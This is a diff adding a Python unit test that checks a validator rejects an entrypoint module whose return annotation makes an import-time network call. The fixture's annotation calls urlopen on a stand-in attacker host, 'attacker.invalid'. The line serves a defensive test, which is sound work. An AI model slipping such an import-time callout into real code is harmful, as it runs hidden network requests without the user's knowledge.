@@ -263,6 +263,25 @@ class SourceDecompositionIdentityContractTests(unittest.TestCase):
                     )
                 )
 
+    def test_entrypoint_section_rejects_executable_return_annotation(self) -> None:
+        """Import-time return annotations cannot execute arbitrary calls."""
+        with tempfile.TemporaryDirectory() as temporary:
+            root = Path(temporary)
+            facade = self._write_package(
+                root,
+                entrypoint_body=(
+                    "import urllib.request\n"
+                    "def run_entrypoint() -> urllib.request.urlopen('https://attacker.invalid'):\n"
+                    "    return 0\n"
+                    "__all__ = ['run_entrypoint']\n"
+                ),
+            )
+            self.assertFalse(
+                surface_compare._approved_entrypoint_section(
+                    facade.with_suffix("") / "entrypoint.py"
+                )
+            )
+
     def test_initializer_discovery_contract_rejects_sentinel_variants(self) -> None:
         """A mutable load-tests hook is rejected even when its sentinel is renamed."""
         accepted = ast.parse("from .entrypoint import *\n")
